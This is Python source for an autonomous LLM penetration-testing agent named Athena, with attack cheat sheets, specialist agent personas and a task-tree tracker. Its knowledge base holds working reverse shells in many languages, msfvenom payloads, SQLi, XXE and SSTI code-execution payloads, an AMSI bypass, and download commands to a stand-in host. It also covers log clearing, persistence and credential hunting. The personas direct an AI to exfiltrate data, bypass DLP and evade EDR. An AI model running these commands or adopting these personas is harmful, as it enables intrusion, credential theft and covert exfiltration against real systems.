EXEC_SESSION_EXIT       = "__SESSION_EXIT__"
EXEC_INTERACTIVE_BLOCKED = "__INTERACTIVE_BLOCKED__"
EXEC_REJECTED           = "__COMMAND_REJECTED__"
EXEC_DESTRUCTIVE        = "__DESTRUCTIVE_REFUSED__"


# ═════════════════════════════════════════════════════════════════════
# KNOWLEDGE BASE — extended from v6.1 with Athena-specific patterns
# ═════════════════════════════════════════════════════════════════════

KB = {}

KB[1] = r"""
S1 OPERATOR MINDSET:
Pick the minimum-path action toward the current PTT node's goal.
Map trust boundaries (web→DB→AD→cloud).  Every command costs noise:
nmap -p- = LOUD, gobuster = MEDIUM, curl single = QUIET.
APT-tier discipline: every command must be deliberate, justified,
and traceable.  Never run anything you can't explain in one sentence.
Three approaches per goal — fall back fast when one fails."""

KB[2] = r"""
S2 NETWORK RECON:
Host discovery: arp-scan -l | fping -ag CIDR | masscan ping
Port scan fast: nmap -sS -T4 --min-rate 5000 -p- | rustscan -a IP
Service detection: nmap -sV -sC -p PORTS
Banner grab: nc -nv IP PORT (one-shot) | curl -sI URL
Stealth: nmap -T1 --scan-delay 5s -f --mtu 8 -D RND:10
UDP top 20: nmap -sU -F (slow but reveals snmp/dns/ntp/ipp)
Script categories: --script vuln | smb-* | http-* | ssl-* | ftp-*
OS fingerprint: nmap -O -A (loud)
ARP/MAC: arp-scan -l --interface=IFACE
Sniff: tcpdump -i IFACE -nn -A | tshark -i IFACE"""

KB[3] = r"""
S3 WEB EXPLOITATION:
Manual recon first — automated tools miss business logic.
Tech ID: whatweb -a 3 URL | wafw00f URL | curl -sI URL | nuclei -t technologies
Dir brute: feroxbuster -u URL -w wordlist -x php,html,txt,bak,zip,old
  Wildcard? feroxbuster --filter-status 200,403 if everything 200
Vhost: gobuster vhost -u URL -w subdomains.txt
SQLi tests: ' OR '1'='1'-- | ' UNION SELECT NULL-- (NULLs++ till no err)
  sqlmap -u URL --batch --random-agent --level=3 --risk=2 --dbs
  File read: ' UNION SELECT load_file('/etc/passwd'),NULL-- (mysql)
XSS: <img src=x onerror=alert(1)> | <svg onload=alert(1)> | <iframe srcdoc>
SSRF: http://169.254.169.254/latest/meta-data/ (AWS IMDSv1)
       http://metadata.google.internal/computeMetadata/v1/ (GCP, needs Metadata-Flavor: Google)
       http://localhost:PORT (internal services)
LFI→RCE: read /etc/passwd → poison logs → include log
XXE: <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
SSTI test: {{7*7}} ${7*7} <%=7*7%> — 49 in response = confirmed
  Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
JWT: cut -d. -f2 then base64 -d; try alg:none; brute with hashcat -m 16500
File upload: change Content-Type, double ext (.php.jpg), null byte, .phtml/.php5
Insecure deserialization: ysoserial.net for .NET, ysoserial for Java"""

KB[4] = r"""
S4 ACTIVE DIRECTORY KILL CHAIN:
Pre-auth → AS-REP roast → crack → authenticated → ACL abuse → DCSync
AS-REP (no creds): impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip DC
  Crack: hashcat -m 18200 hash rockyou.txt
Kerberoast (any user): impacket-GetUserSPNs domain/u:p -dc-ip DC -request
  Crack: hashcat -m 13100 hash rockyou.txt
Pass-the-hash: impacket-psexec dom/u@IP -hashes :NTLM | nxc smb IP -u u -H NTLM
DCSync (DA): impacket-secretsdump dom/admin:pwd@DC
Golden: impacket-ticketer -nthash KRBTGT -domain-sid SID -domain DOM Administrator
Zerologon: nxc smb DC -M zerologon | impacket-zerologon DC_HOST DC_IP
PrintNightmare: ms-rprn / spoolss exploits via impacket
ADCS ESC1-8: certipy find -u u@dom -p p -dc-ip DC | certipy req -upn admin@dom
NTLM relay: responder -I IFACE | ntlmrelayx.py -tf targets.txt -smb2support
Coerce auth: petitpotam DC ATK | coercer coerce -u U -p P -t TGT -l LISTENER
ACL abuse: GenericAll=reset pwd | WriteDACL=grant rights | GenericWrite=set SPN
LDAP: ldapsearch -x -H ldap://DC -b "DC=dom,DC=local" -D "u@dom" -w pwd
BloodHound collection: bloodhound-python -u U -p P -d DOM -ns DC -c All"""

KB[5] = r"""
S5 LINUX PRIVESC:
Sudo GTFOBins: vim→:!sh | find→sudo find / -exec /bin/sh \;
  python3→import os;os.system("/bin/sh") | awk→awk 'BEGIN{system("/bin/sh")}'
  less→!/bin/sh | nano→^R^X reset; sh
SUID: find / -perm -4000 -type f 2>/dev/null
  /usr/bin/find -exec /bin/sh -p \;
  /usr/bin/python -c 'import os;os.execl("/bin/sh","sh","-p")'
Cron: cat /etc/crontab; ls -la /etc/cron.*  (writable script = win)
  Wildcard injection: tar with * + --checkpoint-action
Capabilities: getcap -r / 2>/dev/null
  cap_setuid: python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
Docker group: docker run -v /:/mnt -it alpine chroot /mnt /bin/bash
LXD/LXC: similar — image inject + privileged container
Writable /etc/passwd: openssl passwd -1 P → echo 'r2:HASH:0:0::/:/bin/sh' >> 
NFS no_root_squash: mount, cp $(which sh) ., chmod +s, ./sh -p (locally)
Kernel CVE: linux-exploit-suggester | uname -r → searchsploit
DirtyPipe (5.8-5.16.11): CVE-2022-0847
PwnKit (pkexec): CVE-2021-4034 — works on most distros 2009+
Sudo Baron Samedit (<1.9.5p2): CVE-2021-3156"""

KB[6] = r"""
S6 WINDOWS PRIVESC:
SeImpersonatePrivilege (whoami /priv):
  Win10/Server 2019+: PrintSpoofer
  Server 2012-2022: GodPotato
  Server 2008-2016: JuicyPotato (port 6666 by default)
SeBackupPrivilege: dump SAM/SYSTEM, parse with secretsdump
SeRestorePrivilege: write to protected paths
Unquoted service paths: wmic service get name,pathname,startmode | findstr /i auto
  Place binary at first space-break in path → restart svc as SYSTEM
AlwaysInstallElevated: reg query HKCU/HKLM AlwaysInstallElevated (both =1)
  msfvenom -p windows/exec CMD='net user p P /add' -f msi → msiexec /quiet /i p.msi
Stored creds: cmdkey /list | reg query HKLM /f password /t REG_SZ /s
  dir /s *pass* *cred* | findstr /si password *.txt *.xml *.config
Weak service ACL: accesschk -uwcqv "Authenticated Users" *
  sc config SVC binPath= "cmd /c payload"
Missing patches: systeminfo > si.txt | wesng -i si.txt
DLL hijack: procmon → NAME NOT FOUND with .dll → drop in writable dir
Token impersonation (with admin): incognito module / Tokenvator"""

KB[7] = r"""
S7 POST-EXPLOITATION:
LOTL Linux: bash python3 perl ruby php nc socat curl wget find awk base64 openssl
LOTL Windows: cmd powershell certutil bitsadmin msiexec regsvr32 rundll32 wmic mshta
Persistence Linux: ~/.bashrc | crontab -e | ~/.ssh/authorized_keys | systemd unit
  /etc/rc.local | LD_PRELOAD | apt/yum hook | motd-news
Persistence Win: HKCU\...\Run | HKLM\...\Run | schtasks /create
  sc create | WMI subscription | scheduled tasks | startup folder
Log clean: history -c && history -w | unset HISTFILE | echo > ~/.bash_history
  > /var/log/auth.log (needs root, noisy if monitored)
Pivot Linux: ssh -L | ssh -D (SOCKS) | socat TCP-LISTEN:P,fork TCP:T:P
Pivot Win: netsh interface portproxy add v4tov4
Chisel: server side `chisel server -p 9000 --reverse`
        client side `chisel client SVR:9000 R:8080:internal:80`
Ligolo-ng: modern alternative — better tunnel performance than chisel
Cred hunt Linux: find / -name id_rsa 2>/dev/null | grep -r -E 'pass|secret' /etc 2>/dev/null
  cat ~/.bash_history ~/.zsh_history ~/.aws/credentials ~/.docker/config.json
Cred hunt Win: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  netsh wlan show profile name=SSID key=clear | type %APPDATA%\..\Local\..."""

KB[8] = r"""
S8 HIGH-VALUE CVES (PRIORITISE THESE):
Apache 2.4.49 / 2.4.50 — CVE-2021-41773/42013 path traversal RCE
  curl --path-as-is 'http://t/cgi-bin/.%2F.%2F.%2Fetc/passwd'
EternalBlue — MS17-010 (Win 7/2008/2012)
  nmap --script smb-vuln-ms17-010 | metasploit ms17_010_eternalblue
BlueKeep — CVE-2019-0708 (RDP, Win XP-7/2003-2008R2)
Zerologon — CVE-2020-1472 (any DC pre-Aug 2020 patch)
PrintNightmare — CVE-2021-34527 (any unpatched Win)
Shellshock — CVE-2014-6271 (bash CGI)
  curl -H 'User-Agent: () { :; }; cat /etc/passwd' http://t/cgi-bin/X.cgi
Log4Shell — CVE-2021-44228 (Log4j 2.x, ${jndi:ldap://attacker/a})
Heartbleed — CVE-2014-0160 (OpenSSL 1.0.1 → 1.0.1f)
DirtyCOW — CVE-2016-5195 (Linux <4.8.3)
DirtyPipe — CVE-2022-0847 (Linux 5.8 → 5.16.11)
PwnKit — CVE-2021-4034 (polkit pkexec, almost everywhere)
Sudo Baron Samedit — CVE-2021-3156
Spring4Shell — CVE-2022-22965
Confluence OGNL — CVE-2022-26134, CVE-2023-22515, CVE-2023-22527
Atlassian Jira — CVE-2022-0540, CVE-2024-1597
Citrix NetScaler — CVE-2023-3519, CVE-2023-4966
F5 BIG-IP — CVE-2022-1388, CVE-2023-46747
GitLab — CVE-2023-7028, CVE-2024-7965
PaperCut — CVE-2023-27350
Ivanti — CVE-2023-46805/CVE-2024-21887, CVE-2024-21893"""

KB[9] = r"""
S9 EVASION:
AMSI bypass PS: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
ETW bypass: patch EtwEventWrite in ntdll
Payload obfuscation: msfvenom -e x64/xor_dynamic -i 10
  Veil-Evasion | Donut shellcode | shellter for legit binary backdoor
LOTL delivery: certutil -urlcache -split -f http://A/s.exe s.exe
  bitsadmin /transfer j http://A/s.exe %TEMP%\s.exe
Network evasion: HTTPS C2 :443, randomise UA, jitter timing, low TTL
File upload bypass: image/jpeg with PHP, .php.jpg, .PhP, .phtml, .phar
Frag/decoy: nmap -f --mtu 8 | -D RND:10 --data-length 25 | --source-port 53
Slow recon: nmap -T1 --scan-delay 10s --max-retries 1
MAC spoof: macchanger -r IFACE
Proxychains: edit /etc/proxychains4.conf, prefix command with proxychains4"""

KB[10] = r"""
S10 CREDENTIAL ATTACKS:
Default creds quick wins:
  router admin/admin admin/password root/root | tomcat tomcat/tomcat
  jenkins admin/admin | jboss admin/vagrant | mysql root/(blank)
  redis (no auth often) | mongo (no auth pre-3.0) | elasticsearch (no auth)
  postgres postgres/postgres | gitlab root/5iveL!fe (old default)
Hash modes (hashcat):
  MD5=0 | SHA1=100 | NTLM=1000 | NTLMv2=5600 | bcrypt=3200
  WPA2/WPA3=22000 | LM=3000 | Kerberoast=13100 | AS-REP=18200
  MSCachev2=2100 | MySQL5=300 | MSSQL2012=1731 | LDAP-SHA1=101
Wordlists priority: rockyou.txt → fasttrack → SecLists/Passwords
Spray timing AD: default lockout 5/30min — 1 password / 30min across all users
  nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success
Cred reuse: any creds found → test SSH, SMB, RDP, FTP, web admin, mysql, vpn"""

KB[11] = r"""
S11 METASPLOIT (NON-INTERACTIVE):
Always verify module exists before scripting:
  msfconsole -q -x 'search MODULE; exit' | grep -i exploit
Verified high-impact modules:
  exploit/windows/smb/ms17_010_eternalblue
  exploit/windows/smb/ms17_010_psexec
  exploit/multi/handler  (catch reverse shells)
  exploit/unix/ftp/vsftpd_234_backdoor
  exploit/unix/irc/unreal_ircd_3281_backdoor
  exploit/windows/http/rejetto_hfs_exec
  exploit/multi/http/jenkins_script_console
  exploit/multi/http/log4shell_header_injection
  auxiliary/scanner/smb/smb_ms17_010
  auxiliary/scanner/portscan/tcp
  auxiliary/scanner/smb/smb_login
  auxiliary/scanner/ssh/ssh_login
  auxiliary/scanner/ftp/ftp_login
  post/multi/recon/local_exploit_suggester
  post/linux/gather/hashdump
  post/windows/gather/hashdump
RC script template (LAST LINE MUST BE 'exit'):
  use exploit/...
  set RHOSTS T
  set LHOST L
  set LPORT 4444
  set ExitOnSession false
  run -j
  exit
Run: msfconsole -q -r /tmp/x.rc"""

KB[12] = r"""
S12 REVERSE SHELLS & PAYLOADS:
bash:        bash -i >& /dev/tcp/L/4444 0>&1
bash alt:    0<&196;exec 196<>/dev/tcp/L/4444; sh <&196 >&196 2>&196
python3:     python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("L",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
nc mkfifo:   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc L 4444 >/tmp/f
php:         php -r '$s=fsockopen("L",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
perl:        perl -e 'use Socket;$i="L";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby:        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("L","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
PowerShell:  powershell -nop -W hidden -c "$c=New-Object Net.Sockets.TCPClient('L',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"
msfvenom WINx64: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=L LPORT=4444 -f exe -o s.exe
msfvenom LIN64:  msfvenom -p linux/x64/shell_reverse_tcp LHOST=L LPORT=4444 -f elf -o s.elf
Listener:    rlwrap nc -lvnp 4444  (rlwrap gives arrow-key history)
TTY upgrade after shell:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+Z; stty raw -echo; fg; reset; export TERM=xterm; export SHELL=bash"""

KB[13] = r"""
S13 NETWORK SERVICE QUICKREF:
21 FTP:    ftp anonymous; vsftpd 2.3.4 backdoor (smiley → 6200)
22 SSH:    ssh-audit; CVE-2018-15473 user enum; key auth via -i
25 SMTP:   nc 25 → VRFY/EXPN/RCPT for user enum; open relay test
53 DNS:    dig axfr; recursive resolver; DNSSEC misconfig
80/443:    web (see S3)
88 Kerb:   kerbrute userenum; AS-REP-roast no-creds
110 POP3:  default creds; cleartext auth
111 RPC:   rpcinfo -p; nfs share enum
135/445:   SMB/RPC (see S4)
139 NetB:  nbtscan; legacy SMB
161 SNMP:  onesixtyone; snmpwalk -c public -v2c IP
389/636:   LDAP; ldapsearch anonymous bind; null search
443:       TLS audit (see S15); cert SAN enum
445 SMB:   nxc smb; enum4linux-ng; smbclient -L
512/513/514: rsh/rlogin/rexec; legacy
623 IPMI:  default creds; CVE-2013-4786 hash extraction
873 rsync: rsync IP:: (list modules); often unauth read
1433 MSSQL: nxc mssql; impacket-mssqlclient
1521 Oracle: oscanner; tnscmd10g
2049 NFS:  showmount -e; mount -o nolock; check no_root_squash
2375/2376: Docker API; docker -H tcp://IP:2375 ps
3306 MySQL: mysql -h IP -u root --password=
3389 RDP:  xfreerdp; ncrack rdp; BlueKeep
5432 Pgsql: psql -h IP -U postgres
5985/5986: WinRM; evil-winrm -u U -p P -i IP
5900 VNC:  vncviewer; often no auth or weak pass
6379 Redis: redis-cli -h IP; KEYS *; CONFIG SET dir; webshell write
9200 Elastic: curl IP:9200/_cat/indices; old versions no auth
27017 Mongo: mongo IP:27017; show dbs"""

KB[14] = r"""
S14 DECISION TREES (when stuck pivot here):
Web stuck → tech ID → CVE-search version → robots.txt/.git/sitemap →
   default creds → file upload bypass → second-order via API → vhost
   enumeration → HTTP method tampering → header injection
Shell stuck → pty stabilise → id/uname/sudo -l → SUID/cron/caps →
   linpeas → cred hunt → kernel exploit → docker/lxd/snap → suid_diff
Unknown port → nc -nv banner → nmap -sV --version-all → -A → curl →
   searchsploit banner → metasploit auxiliary scanner
AD stuck → SMB null sess → LDAP anon → RPC enum → AS-REP-roast →
   kerbrute userenum → password spray (lockout-aware) → printerbug/
   petitpotam coerce → ntlmrelay
Phys/IoT → nmap -p- low rate → device fingerprint → default creds →
   firmware extract (binwalk) → strings on bin → uart/jtag if hands-on"""

KB[15] = r"""
S15 SSL/TLS:
sslscan IP:443 — fast cipher list
testssl.sh --severity HIGH IP:443 — comprehensive
sslyze --regular IP:443
openssl s_client -connect IP:443 -showcerts (manual)
Look for: weak ciphers (RC4,3DES,DES,EXPORT), TLSv1/1.1, weak DH (<2048),
   self-signed in prod, expired certs, SAN list (subdomains!)
Heartbleed: nmap --script ssl-heartbleed (CVE-2014-0160)
ROBOT: nmap --script ssl-cccs-injection
POODLE: SSL3 enabled
LOGJAM: weak DH params
DROWN: SSLv2 enabled"""

KB[16] = r"""
S16 OSINT:
whois DOMAIN
dig DOMAIN ANY +noall +answer
crt.sh: curl -s 'https://crt.sh/?q=%25.DOMAIN&output=json' | jq -r '.[].name_value' | sort -u
theHarvester -d DOMAIN -b google,bing,crtsh,duckduckgo,linkedin
amass enum -active -d DOMAIN
subfinder -d DOMAIN -all
github-search: github.com/search?q="DOMAIN"+password
shodan: shodan host IP | shodan search 'org:"COMPANY"'
google dorks: site:DOMAIN ext:pdf | inurl:admin | filetype:env
metagoofil -d DOMAIN -t pdf,doc,xls -l 100 -o files
exiftool * — metadata strip-mining
fierce --domain DOMAIN
sherlock USERNAME (social media enum)
holehe EMAIL (account enum)"""


WORKFLOW_KB_MAP = {
    "1":  [2, 8, 14],          # Network Recon
    "2":  [3, 8, 14],          # Web Enum
    "3":  [5, 7, 10, 14],      # Linux Post-Exploit
    "4":  [11, 12],            # Metasploit
    "5":  [3, 10, 14],         # SQL Injection
    "6":  [10],                # Hash Cracking
    "7":  [10, 13],            # Password Spraying
    "8":  [4, 10, 9],          # AD Recon
    "9":  [11, 12, 9],         # Payload Generation
    "10": [2],                 # Bluetooth Recon
    "11": [16, 2, 3, 14],      # OSINT
    "12": [15, 2, 8],          # SSL/TLS Audit
    "13": [16, 2, 13],         # DNS Enum
    "14": [4, 10, 13],         # SMB Attack
    "15": [3, 14],             # API Security
    "16": [5, 7, 14],          # Linux Privesc
    "17": [6, 7, 10],          # Windows Privesc
    "18": [4, 7, 9],           # Lateral Movement
    "19": [7, 9],              # Container/Cloud
    "20": [9, 2],              # Evasion
    "21": [7, 9],              # Exfil
    "22": [14],                # Forensics
    "23": [14],                # Stego
}

KEYWORD_KB_MAP = {
    "web|http|https|sql|xss|lfi|rfi|ssrf|api|jwt|oauth|cookie|upload": [3, 14],
    "smb|windows|active.directory|domain|kerberos|ntlm|ldap|dc\\b|\\bad\\b": [4, 10],
    "linux|sudo|suid|cron|privilege|root|privesc|escalat": [5, 7, 14],
    "windows|system|service|token|potato|uac|dll": [6, 7, 10],
    "hash|crack|hashcat|password|spray|brute|credential": [10, 12],
    "metasploit|msf|msfvenom|payload|shell|reverse": [11, 12],
    "evasion|bypass|amsi|antivirus|av\\b|ids|ips|stealth": [9],
    "lateral|pivot|pass.the|pth|dcsync|secretsdump": [4, 7, 9],
    "nmap|scan|recon|network|port|service": [2, 8, 14],
    "cloud|docker|container|aws|gcp|azure|kubernetes|k8s": [7, 9],
    "ssl|tls|cipher|heartbleed|certificate": [15],
    "osint|whois|subdomain|crt\\.sh|harvester": [16],
}


def get_kb_sections(workflow_key: Optional[str] = None,
                    prompt_text: str = "",
                    agent_role: str = "") -> str:
    """Return only the KB sections relevant to this workflow / agent / prompt."""
    section_nums = {1}  # mindset always

    if workflow_key and workflow_key in WORKFLOW_KB_MAP:
        section_nums.update(WORKFLOW_KB_MAP[workflow_key])

    # Agent-role-driven KB selection
    role_map = {
        "recon":           [2, 8, 13, 14, 16],
        "web":             [3, 8, 13, 14, 15],
        "network":         [2, 8, 11, 13],
        "ad":              [4, 10, 11, 13],
        "linux_privesc":   [5, 7, 14],
        "windows_privesc": [6, 7, 10],
        "credential":      [10, 12],
        "exfil":           [7, 9, 12],
        "evasion":         [9, 2],
        "reporter":        [14],
        "strategist":      [1, 14],
    }
    if agent_role in role_map:
        section_nums.update(role_map[agent_role])

    if prompt_text and len(section_nums) <= 2:
        lower = prompt_text.lower()
        for pattern, nums in KEYWORD_KB_MAP.items():
            if re.search(pattern, lower):
                section_nums.update(nums)

    if len(section_nums) == 1:
        section_nums.update([2, 14])

    parts = []
    for num in sorted(section_nums):
        if num in KB:
            parts.append(KB[num])
    return "\n\n".join(parts)


# ═════════════════════════════════════════════════════════════════════
# AGENT SPECIFICATIONS
#
# Each agent is a specialist system-prompt fragment.  Athena's
# dispatcher picks one based on the current PTT node's phase.
# Picking a specialist is NOT a separate LLM call — the dispatcher
# is deterministic, so this is "multi-agent" in design without paying
# the rate-limit cost of multi-agent at runtime.
# ═════════════════════════════════════════════════════════════════════

AGENT_SPECS = {

    "strategist": {
        "name": "STRATEGIST",
        "icon": "♔",
        "color": "35",  # magenta
        "persona": (
            "You are Athena's Strategist agent.  Your job is to read the "
            "Pentesting Task Tree (PTT) and decide which child node to attack "
            "next, OR add a new child node when discovery reveals one.  You "
            "do NOT write commands.  You output a routing decision."
        ),
        "extra_rules": (
            "OUTPUT FORMAT:\n"
            "[THOUGHT]<one paragraph reasoning over PTT state>[/THOUGHT]\n"
            "[NEXT_NODE]<node id from PTT, e.g. 1.2.3>[/NEXT_NODE]\n"
            "[AGENT]<one of: recon, web, network, ad, linux_privesc, "
            "windows_privesc, credential, exfil, evasion, reporter>[/AGENT]\n"
            "[CONF]<green|yellow|red>[/CONF]\n"
            "Use WORKFLOW_COMPLETE in [NEXT_NODE] when the root goal is met."
        ),
    },

    "recon": {
        "name": "RECON SPECIALIST",
        "icon": "🔍",
        "color": "36",  # cyan
        "persona": (
            "You are Athena's Reconnaissance specialist.  Network discovery, "
            "port scanning, service fingerprinting, OS detection.  Quiet first, "
            "loud second.  You think like the first 30 minutes of a real engagement."
        ),
        "extra_rules": (
            "Default to nmap/rustscan/masscan for ports.  Use whatweb/curl -I "
            "for HTTP service ID.  Run searchsploit on every confirmed service "
            "version.  When you have ports + versions, say WORKFLOW_COMPLETE "
            "or hand off to a more specific specialist by writing "
            "[HANDOFF]<agent>[/HANDOFF] in your thought."
        ),
    },

    "web": {
        "name": "WEB EXPLOITATION SPECIALIST",
        "icon": "🕸",
        "color": "33",  # yellow
        "persona": (
            "You are Athena's Web Exploitation specialist.  HTTP/HTTPS surface "
            "only.  Tech ID → CVE → input testing → auth bypass → file/SSRF/SSTI."
        ),
        "extra_rules": (
            "Always whatweb before brute.  Feroxbuster > gobuster (modern, faster).  "
            "Test SSTI with {{7*7}}, SQLi with ', LFI with /etc/passwd, "
            "XXE with <!ENTITY>.  Check /robots.txt /.git /.env /backup before brute."
        ),
    },

    "network": {
        "name": "NETWORK EXPLOITATION SPECIALIST",
        "icon": "🌐",
        "color": "34",  # blue
        "persona": (
            "You are Athena's Network Exploitation specialist.  Non-web "
            "services: SSH, FTP, SMB, RDP, VPN, databases, RPC, mail.  "
            "Banner-grab → CVE-search → default creds → exploit → shell."
        ),
        "extra_rules": (
            "Use nxc (crackmapexec successor) for SMB/RDP/SSH/MSSQL/WinRM.  "
            "Always test default creds first.  Searchsploit every service "
            "version.  For SMB always check ms17-010 first."
        ),
    },

    "ad": {
        "name": "ACTIVE DIRECTORY SPECIALIST",
        "icon": "🏰",
        "color": "31",  # red
        "persona": (
            "You are Athena's Active Directory specialist.  Domain attacks: "
            "AS-REP roast, Kerberoast, NTLM relay, ACL abuse, ADCS, Zerologon, "
            "DCSync.  Lockout-aware spraying."
        ),
        "extra_rules": (
            "Stages: anonymous → users enum → AS-REP no-creds → spray with care → "
            "authenticated enum → ACL abuse → DCSync.  Default lockout = 5/30min, "
            "so 1 password per 30min when spraying.  Use kerbrute, nxc, impacket-*, "
            "certipy, bloodhound-python."
        ),
    },

    "linux_privesc": {
        "name": "LINUX PRIVESC SPECIALIST",
        "icon": "🐧",
        "color": "32",  # green
        "persona": (
            "You are Athena's Linux post-exploitation and privesc specialist.  "
            "id/whoami/uname → sudo -l → SUID → cron → caps → docker/lxd → "
            "kernel CVE → cred hunt."
        ),
        "extra_rules": (
            "First three commands always: id, sudo -l, find / -perm -4000 2>/dev/null.  "
            "GTFOBins for every result.  Then linpeas if quiet permitted."
        ),
    },

    "windows_privesc": {
        "name": "WINDOWS PRIVESC SPECIALIST",
        "icon": "🪟",
        "color": "94",
        "persona": (
            "You are Athena's Windows post-exploitation and privesc specialist.  "
            "whoami /priv/groups → systeminfo → service enum → token abuse → "
            "AlwaysInstallElevated → stored creds."
        ),
        "extra_rules": (
            "First three commands: whoami /all, systeminfo, "
            "wmic service get name,pathname,startmode.  PrintSpoofer/GodPotato "
            "if SeImpersonate.  wesng on systeminfo output."
        ),
    },

    "credential": {
        "name": "CREDENTIAL ATTACK SPECIALIST",
        "icon": "🔑",
        "color": "33",
        "persona": (
            "You are Athena's Credential specialist.  Cracking, spraying, reuse, "
            "hash conversion.  hashcat/john/hydra/nxc."
        ),
        "extra_rules": (
            "Always hashid first to identify mode.  Ensure rockyou.txt is gunzipped.  "
            "Try hashcat --show before full crack (cached results).  After any cred "
            "success, immediately test reuse across SSH/SMB/FTP/RDP/web."
        ),
    },

    "exfil": {
        "name": "EXFILTRATION SPECIALIST",
        "icon": "📤",
        "color": "95",
        "persona": (
            "You are Athena's Data Exfiltration specialist.  Covert channels, "
            "DLP bypass, archive + transfer."
        ),
        "extra_rules": (
            "Test outbound first (curl ifconfig.me).  HTTPS POST > DNS > ICMP "
            "in stealth priority.  Always tar+gzip+gpg before exfil."
        ),
    },

    "evasion": {
        "name": "EVASION SPECIALIST",
        "icon": "🥷",
        "color": "90",
        "persona": (
            "You are Athena's Evasion specialist.  AV/EDR/IDS/IPS bypass, "
            "log cleaning, MAC spoof, fragmentation, decoys, AMSI bypass."
        ),
        "extra_rules": (
            "When previous loud cmd was blocked/detected, switch to evasive "
            "mode: -T1 timing, --data-length, decoys, source-port 53."
        ),
    },

    "reporter": {
        "name": "REPORTING / CLEANUP",
        "icon": "📋",
        "color": "97",
        "persona": (
            "You are Athena's Reporter agent.  You consolidate findings, drop "
            "unverified noise, write clean prose."
        ),
        "extra_rules": (
            "Output structured report with: Executive Summary, Confirmed Findings, "
            "Attack Chain, Remediation.  Drop any finding flagged unverified."
        ),
    },
}


# Phase → preferred agent role mapping (used by deterministic dispatcher)
PHASE_TO_AGENT = {
    "recon":          "recon",
    "enum":           "recon",
    "web":            "web",
    "web_recon":      "web",
    "web_exploit":    "web",
    "network":        "network",
    "service_exploit":"network",
    "ad":             "ad",
    "ad_recon":       "ad",
    "ad_exploit":     "ad",
    "linux_post":     "linux_privesc",
    "linux_privesc":  "linux_privesc",
    "windows_post":   "windows_privesc",
    "windows_privesc":"windows_privesc",
    "credential":     "credential",
    "cred_attack":    "credential",
    "cracking":       "credential",
    "exfil":          "exfil",
    "evasion":        "evasion",
    "report":         "reporter",
}


# ═════════════════════════════════════════════════════════════════════
# PENTESTING TASK TREE (PTT)
#
# Hierarchical state.  Each node tracks status / confidence / findings /
# attempts / tool / parent / children.  Replaces v6.1's flat findings
# dict.  The whole tree gets serialised to natural language for system
# prompts so the LLM sees the entire engagement state every turn.
# ═════════════════════════════════════════════════════════════════════

@dataclass
class Finding:
    """Source-tagged finding.  Phantoms can't sneak in because every
    finding records the exact subprocess command that produced it.
    v7.1: now carries optional MITRE ATT&CK technique tag."""
    fid:       int
    value:     str
    ftype:     str               # ip, port, user, hash, cred, cve, ...
    source_cmd: str              # the shell command that produced this
    node_id:    str              # which PTT node was active
    verified:   bool = False
    notes:      str = ""
    timestamp:  str = ""
    attack_id:  str = ""         # v7.1 — MITRE ATT&CK technique ID
    attack_name: str = ""        # v7.1 — human-readable name
    attack_tactic: str = ""      # v7.1 — tactic category

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class PTTNode:
    nid:        str               # dotted id, e.g. "1.2.3"
    title:      str
    phase:      str               # recon, enum, web, ad, linux_post, ...
    status:     str = "todo"      # todo, in_progress, done, dead_end, skipped
    confidence: str = "green"     # green, yellow, red
    parent_id:  Optional[str] = None
    children:   List[str] = field(default_factory=list)
    findings:   List[int] = field(default_factory=list)
    attempts:   int = 0
    last_cmd:   str = ""
    notes:      str = ""

    @property
    def depth(self) -> int:
        return self.nid.count(".")


class PTT:
    """Pentesting Task Tree.

    Provides:
      - hierarchical task state
      - findings storage with source-tagging
      - natural-language serialiser for LLM prompts
      - terminal renderer for the REPL
      - dead-end detection + sibling lookup for backtracking
    """

    STATUS_GLYPH = {
        "todo":         "○",
        "in_progress":  "◐",
        "done":         "●",
        "dead_end":     "✗",
        "skipped":      "─",
    }
    CONF_COLOR = {
        "green":  "32",
        "yellow": "33",
        "red":    "31",
    }

    def __init__(self, goal: str = "Compromise target"):
        self.nodes: Dict[str, PTTNode] = {}
        self.findings: List[Finding] = []
        self._next_finding_id = 1
        self.root_id = "0"
        # Root node represents the overall mission
        self.nodes[self.root_id] = PTTNode(
            nid=self.root_id, title=goal, phase="root", status="in_progress"
        )

    # ─── Tree construction ─────────────────────────────────────────

    def add_node(self, parent_id: str, title: str, phase: str,
                 status: str = "todo") -> str:
        if parent_id not in self.nodes:
            raise ValueError(f"Unknown parent: {parent_id}")
        parent = self.nodes[parent_id]
        idx = len(parent.children) + 1
        nid = f"{parent_id}.{idx}" if parent_id != self.root_id else str(idx)
        node = PTTNode(nid=nid, title=title, phase=phase,
                       status=status, parent_id=parent_id)
        self.nodes[nid] = node
        parent.children.append(nid)
        return nid

    # ─── Status & status helpers ────────────────────────────────────

    def set_status(self, nid: str, status: str):
        if nid in self.nodes:
            self.nodes[nid].status = status

    def set_confidence(self, nid: str, conf: str):
